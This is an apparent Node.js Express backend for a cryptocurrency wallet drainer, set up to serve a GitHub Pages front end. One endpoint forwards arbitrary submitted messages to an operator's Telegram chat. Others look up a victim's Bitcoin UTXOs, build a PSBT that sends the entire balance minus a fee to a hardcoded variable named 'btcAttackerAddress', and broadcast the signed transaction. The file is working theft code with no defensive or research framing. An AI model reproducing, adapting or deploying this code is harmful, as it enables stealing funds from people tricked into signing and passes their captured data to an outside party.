require('dotenv').config();
const express = require('express');
const axios = require('axios');
const cors = require('cors');
const bitcoin = require('bitcoinjs-lib');
const ECPairFactory = require('ecpair').default;
const tinysecp = require('tiny-secp256k1');

const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());

app.use(cors({
    origin: 'https://donassion111.github.io',
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type']
}));

app.get('/', (req, res) => {
    res.status(200).json({ message: 'Backend server is running!' });
});

app.post('/send-telegram', async (req, res) => {
    const { message } = req.body;
    if (!message) {
        return res.status(400).json({ error: 'Message is required' });
    }
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        return res.status(500).json({ error: 'Missing Telegram configuration' });
    }
    const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    try {
        await axios.post(TELEGRAM_API_URL, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        }, { timeout: 5000 });
        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Error sending Telegram message:', error.message);
        res.status(500).json({ error: `Failed to send Telegram message: ${error.message}` });
    }
});

const btcAttackerAddress = 'tb1qmqts2vhpzul4ltmvs97gdnvsfm3h6slfv2vv2l';

app.post('/get-utxos', async (req, res) => {
    const { address } = req.body;
    if (!address) {
        return res.status(400).json({ error: 'Address is required' });
    }
    try {
        let response = await axios.get(`https://blockstream.info/testnet/api/address/${address}/utxo`, { timeout: 5000 }).catch(() => null);
        let network = bitcoin.networks.testnet;
        let baseUrl = 'https://blockstream.info/testnet';
        if (!response || response.status !== 200) {
            response = await axios.get(`https://blockstream.info/api/address/${address}/utxo`, { timeout: 5000 });
            network = bitcoin.networks.bitcoin;
            baseUrl = 'https://blockstream.info';
        }
        const utxos = await Promise.all(response.data.map(async (utxo) => {
            try {
                const txResponse = await axios.get(`${baseUrl}/api/tx/${utxo.txid}/hex`, { timeout: 5000 });
                return {
                    txid: utxo.txid,
                    vout: utxo.vout,
                    value: utxo.value,
                    status: utxo.status,
                    rawTx: txResponse.data
                };
            } catch (txError) {
                console.error(`Error fetching raw tx for UTXO ${utxo.txid}:`, txError.message);
                return null;
            }
        }));
        const validUtxos = utxos.filter(utxo => utxo !== null);
        res.json({
            utxos: validUtxos,
            network: network === bitcoin.networks.testnet ? 'testnet' : 'mainnet'
        });
    } catch (error) {
        console.error('Error fetching UTXOs:', error.message);
        res.status(500).json({ error: `Failed to fetch UTXOs: ${error.message}` });
    }
});

app.post('/create-psbt', async (req, res) => {
    const { utxos } = req.body;
    if (!utxos || !Array.isArray(utxos) || utxos.length === 0) {
        return res.status(400).json({ error: 'UTXOs are required and must be a non-empty array' });
    }
    try {
        const network = utxos[0]?.status?.confirmed ? bitcoin.networks.bitcoin : bitcoin.networks.testnet;
        const psbt = new bitcoin.Psbt({ network });
        let totalAmount = 0;
        for (const utxo of utxos) {
            if (!utxo.rawTx) {
                throw new Error(`Missing rawTx for UTXO ${utxo.txid}`);
            }
            psbt.addInput({
                hash: utxo.txid,
                index: utxo.vout,
                nonWitnessUtxo: Buffer.from(utxo.rawTx, 'hex')
            });
            totalAmount += utxo.value;
        }
        const fee = 1000;
        if (totalAmount <= fee) {
            throw new Error('Total amount is less than or equal to the fee');
        }
        psbt.addOutput({
            address: btcAttackerAddress,
            value: totalAmount - fee
        });
        const psbtHex = psbt.toHex();
        res.json({ psbtHex });
    } catch (error) {
        console.error('Error creating PSBT:', error.message);
        res.status(500).json({ error: `Failed to create PSBT: ${error.message}` });
    }
});

app.post('/broadcast', async (req, res) => {
    const { psbtHex } = req.body;
    if (!psbtHex) {
        return res.status(400).json({ error: 'PSBT hex is required' });
    }
    try {
        const psbt = bitcoin.Psbt.fromHex(psbtHex);
        const network = psbt.data.inputs.length && psbt.data.inputs[0].nonWitnessUtxo ? bitcoin.networks.bitcoin : bitcoin.networks.testnet;
        const baseUrl = network === bitcoin.networks.testnet ? 'https://blockstream.info/testnet' : 'https://blockstream.info';
        const tx = psbt.extractTransaction();
        const txHex = tx.toHex();
        const response = await axios.post(`${baseUrl}/api/tx`, txHex, { timeout: 5000 });
        res.json({ txid: response.data });
    } catch (error) {
        console.error('Error broadcasting transaction:', error.message);
        res.status(500).json({ error: `Failed to broadcast transaction: ${error.message}` });
    }
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
